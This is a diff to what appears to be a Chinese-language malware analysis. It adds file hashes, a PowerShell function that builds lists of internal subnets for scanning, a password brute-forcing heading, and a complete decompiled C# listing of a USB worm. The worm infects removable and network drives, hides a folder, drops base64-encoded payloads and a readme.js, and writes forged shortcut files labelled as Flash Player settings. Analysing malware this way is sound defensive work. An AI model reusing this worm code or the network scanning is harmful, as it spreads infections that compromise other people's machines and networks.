@@ -1,9 +1,19 @@
 
 
 ```
-$ hash256 if.bin                                                                                                                                                                                                                                      989bf47336bf6762a37e90c485199e2cdf0c6ea21ccf6b26845a87e1f8984ab8  if.bin
+$ hash256 if.bin                                                                                                                                                   
+989bf47336bf6762a37e90c485199e2cdf0c6ea21ccf6b26845a87e1f8984ab8  if.bin
+
 ```
 
+
+```
+$ file ksegmeve.dll
+ksegmeve.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+$ hash256 ksegmeve.dll
+51c91efec0126ac197b3dd4b9045a1dbc2eca9c7c7f43d53ebb99377b4388eec  ksegmeve.dll
+```
 
 
 #### 参考链接：
@@ -129,7 +139,18 @@ $sc=[Convert]::FromBase64String("McBAD4SsB
 
 ```
 
-爆破密码
+#### 获取ip地址：
+```
+function getipaddrs($flag){
+	write-host "Get ipaddress..."
+	$global:ipaddrs_i = @()
+	$global:ipaddrs_o = @()
+	$allip = @()
+	[string[]]$ipsub = @('192.168.0','192.168.1','192.168.2','192.168.3','192.168.4','192.168.5','192.168.6','192.168.7','192.168.8','192.168.9','192.168.10','192.168.18','192.168.31','192.168.199','192.168.254','192.168.67','10.0.0','10.0.1','10.0.2','10.1.1','10.90.90','10.1.10','10.10.1','172.16.1','172.16.2','172.16.3')
+	[string[]]$ipsub_o = @()
+```
+
+#### 爆破密码
 
 ```
 [string[]]$global: alluser = @("administrator", "admin")
@@ -446,4 +467,437 @@ function Gen-NTLM($str){
 ```
 
 
+#### ksegmeve.dll for dnspy 
+https://github.com/dnSpy/dnSpy/releases
+
+```
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Threading;
+
+namespace USB
+{
+    // Token: 0x02000002 RID: 2
+    public class USBLNK
+    {
+        // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
+        public static void Main1(string b1, string b2, string b3)
+        {
+            USBLNK.gb3 = b1;
+            USBLNK.gb6 = b2;
+            USBLNK.jsdata = b3;
+            Timer timer = new Timer(new TimerCallback(USBLNK.ResetBlacklist), null, 10000, 10000);
+            for (;;)
+            {
+                USBLNK.BaseMode();
+                Thread.Sleep(5000);
+            }
+        }
+
+        // Token: 0x06000002 RID: 2 RVA: 0x000020A5 File Offset: 0x000002A5
+        private static void ResetBlacklist(object state)
+        {
+            USBLNK.blacklist.Clear();
+        }
+
+        // Token: 0x06000003 RID: 3 RVA: 0x000020B4 File Offset: 0x000002B4
+        private static bool CreateHomeDirectory(string drive)
+        {
+            try
+            {
+                DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + "UTFsync");
+                directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
+                return true;
+            }
+            catch
+            {
+            }
+            return false;
+        }
+
+        // Token: 0x06000004 RID: 4 RVA: 0x00002100 File Offset: 0x00000300
+        private static bool IsSupported(DriveInfo drive)
+        {
+            return drive.IsReady && drive.AvailableFreeSpace > 1024L && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network) && (drive.DriveFormat == "FAT32" || drive.DriveFormat == "NTFS");
+        }
+
+        // Token: 0x06000005 RID: 5 RVA: 0x00002164 File Offset: 0x00000364
+        private static bool CheckBlacklist(string name)
+        {
+            return name == "UTFsync" || name == "System Volume Information" || name == ".BIN";
+        }
+
+        // Token: 0x06000006 RID: 6 RVA: 0x000021A0 File Offset: 0x000003A0
+        private static bool Infect(string drive)
+        {
+            bool result;
+            if (USBLNK.blacklist.Contains(drive))
+            {
+                result = true;
+            }
+            else
+            {
+                USBLNK.CreateLnk(drive, "blue3.bin", USBLNK.gb3);
+                USBLNK.CreateLnk(drive, "blue6.bin", USBLNK.gb6);
+                USBLNK.CreateJs(drive, "readme.js", USBLNK.jsdata);
+                try
+                {
+                    File.Create(drive + "UTFsync\\inf_data");
+                    return true;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+                result = false;
+            }
+            return result;
+        }
+
+        // Token: 0x06000007 RID: 7 RVA: 0x00002238 File Offset: 0x00000438
+        private static bool CreateJs(string drive, string fname, string gb)
+        {
+            FileStream fileStream = new FileStream(drive + fname, FileMode.Create);
+            byte[] array = Convert.FromBase64String(gb);
+            fileStream.Write(array, 0, array.Length);
+            fileStream.Close();
+            Console.WriteLine(array.Length);
+            return true;
+        }
+
+        // Token: 0x06000008 RID: 8 RVA: 0x00002368 File Offset: 0x00000568
+        private static bool CreateLnk(string drive, string binfname, string gb)
+        {
+            byte[] array = new byte[]
+            {
+                76,
+                0,
+                0,
+                0,
+                1,
+                20,
+                2,
+                0,
+                0,
+                0,
+                0,
+                0,
+                192,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                70,
+                129,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                156,
+                0,
+                20,
+                0,
+                31,
+                128,
+                32,
+                32,
+                236,
+                33,
+                234,
+                58,
+                105,
+                16,
+                162,
+                221,
+                8,
+                0,
+                43,
+                48,
+                48,
+                157,
+                134,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                106,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0
+            };
+            byte[] array2 = new byte[]
+            {
+                58,
+                0,
+                92
+            };
+            byte[] array3 = new byte[]
+            {
+                0,
+                0,
+                0,
+                70,
+                0,
+                108,
+                0,
+                97,
+                0,
+                115,
+                0,
+                104,
+                0,
+                32,
+                0,
+                80,
+                0,
+                108,
+                0,
+                97,
+                0,
+                121,
+                0,
+                101,
+                0,
+                114,
+                0,
+                0,
+                0,
+                77,
+                0,
+                97,
+                0,
+                110,
+                0,
+                97,
+                0,
+                103,
+                0,
+                101,
+                0,
+                32,
+                0,
+                70,
+                0,
+                108,
+                0,
+                97,
+                0,
+                115,
+                0,
+                104,
+                0,
+                32,
+                0,
+                80,
+                0,
+                108,
+                0,
+                97,
+                0,
+                121,
+                0,
+                101,
+                0,
+                114,
+                0,
+                32,
+                0,
+                83,
+                0,
+                101,
+                0,
+                116,
+                0,
+                116,
+                0,
+                105,
+                0,
+                110,
+                0,
+                103,
+                0,
+                115,
+                0,
+                0,
+                0,
+                0,
+                0,
+                16,
+                0,
+                0,
+                0,
+                5,
+                0,
+                0,
+                160,
+                3,
+                0,
+                0,
+                0,
+                20,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0
+            };
+            for (char c = 'D'; c <= 'K'; c += '\u0001')
+            {
+                FileStream fileStream = new FileStream(drive + c.ToString() + binfname.Replace(".bin", ".lnk"), FileMode.Create);
+                fileStream.Write(array, 0, array.Length);
+                byte[] array4 = new byte[4];
+                int num = binfname.Length + 4;
+                array4[0] = (byte)(num & 255);
+                array4[1] = (byte)((num & 65280) >> 8);
+                array4[2] = 13;
+                array4[3] = 0;
+                fileStream.Write(array4, 0, array4.Length);
+                byte[] array5 = new byte[]
+                {
+                    (byte)(c & 'ÿ'),
+                    (byte)((c & '＀') >> 8)
+                };
+                fileStream.Write(array5, 0, array5.Length);
+                fileStream.Write(array2, 0, array2.Length);
+                foreach (char c2 in binfname)
+                {
+                    byte[] array6 = new byte[]
+                    {
+                        (byte)((c2 & '＀') >> 8),
+                        (byte)(c2 & 'ÿ')
+                    };
+                    fileStream.Write(array6, 0, array6.Length);
+                }
+                fileStream.Write(array3, 0, array3.Length);
+                fileStream.Close();
+            }
+            FileStream fileStream2 = new FileStream(drive + binfname, FileMode.Create);
+            byte[] array7 = Convert.FromBase64String(gb);
+            fileStream2.Write(array7, 0, array7.Length);
+            fileStream2.Close();
+            Console.WriteLine(array7.Length);
+            return true;
+        }
+
+        // Token: 0x06000009 RID: 9 RVA: 0x00002540 File Offset: 0x00000740
+        private static void BaseMode()
+        {
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            foreach (DriveInfo driveInfo in drives)
+            {
+                if (!USBLNK.blacklist.Contains(driveInfo.Name))
+                {
+                    Console.WriteLine("Detect drive:" + driveInfo.Name);
+                    if (USBLNK.IsSupported(driveInfo))
+                    {
+                        if (!File.Exists(driveInfo + "UTFsync\\inf_data"))
+                        {
+                            Console.WriteLine("Try to infect " + driveInfo.Name);
+                            if (USBLNK.CreateHomeDirectory(driveInfo.Name) && USBLNK.Infect(driveInfo.Name))
+                            {
+                                USBLNK.blacklist.Add(driveInfo.Name);
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine(driveInfo.Name + " already infected!");
+                            USBLNK.blacklist.Add(driveInfo.Name);
+                        }
+                    }
+                    else
+                    {
+                        USBLNK.blacklist.Add(driveInfo.Name);
+                    }
+                }
+            }
+        }
+
+        // Token: 0x04000001 RID: 1
+        private const string home = "UTFsync";
+
+        // Token: 0x04000002 RID: 2
+        private const string inf_data = "\\inf_data";
+
+        // Token: 0x04000003 RID: 3
+        public static List<string> blacklist = new List<string>();
+
+        // Token: 0x04000004 RID: 4
+        public static string gb3;
+
+        // Token: 0x04000005 RID: 5
+        public static string gb6;
+
+        // Token: 0x04000006 RID: 6
+        public static string jsdata;
+    }
+}
+
+```
 
